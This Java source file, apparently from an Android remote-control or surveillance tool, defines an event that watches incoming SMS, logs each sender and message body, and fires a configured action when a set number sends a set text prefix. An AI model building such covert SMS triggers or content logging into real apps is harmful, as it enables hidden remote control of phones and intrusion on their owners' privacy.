package com.ht.RCSAndroidGUI.event;

import java.io.IOException;

import android.util.Log;

import com.ht.RCSAndroidGUI.Sms;
import com.ht.RCSAndroidGUI.interfaces.Observer;
import com.ht.RCSAndroidGUI.listener.ListenerSms;
import com.ht.RCSAndroidGUI.util.DataBuffer;
import com.ht.RCSAndroidGUI.util.WChar;

public class EventSms extends EventBase implements Observer<Sms> {
	/** The Constant TAG. */
	private static final String TAG = "EventSms";

	private int actionOnEnter;
	private String number, msg;
	
	@Override
	public void begin() {
		ListenerSms.self().attach(this);
	}

	@Override
	public void end() {
		ListenerSms.self().detach(this);
	}

	@Override
	public boolean parse(EventConf event) {
		super.setEvent(event);

		final byte[] conf = event.getParams();

		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
		
		try {
			actionOnEnter = event.getAction();

			// Estraiamo il numero di telefono
			byte[] num = new byte[databuffer.readInt()];
			databuffer.read(num);

			number = WChar.getString(num, true);
			
			// Estraiamo il messaggio atteso
			byte[] text = new byte[databuffer.readInt()];
			databuffer.read(text);
			
			msg = WChar.getString(text, true);
			
			num = text = null;
		} catch (final IOException e) {
			Log.d("QZ", TAG + " Error: params FAILED");
			return false;
		}
		
		return true;
	}

	@Override
	public void go() {
		// TODO Auto-generated method stub
	}

	// Viene richiamata dal listener (dalla dispatch())
	public int notification(Sms s) {
		Log.d("QZ", TAG + " Got SMS notification from: " + s.getAddress() + " Body: " + s.getBody());
		
		if (s.getAddress().equals(this.number) == false) {
			return 0;
		}
		
		// Case sensitive
		if (s.getBody().startsWith(this.msg) == false) {
			return 0;
		}
		
		onEnter();
		return 1;
	}
	
	public void onEnter() {
		trigger(actionOnEnter);
	}
}
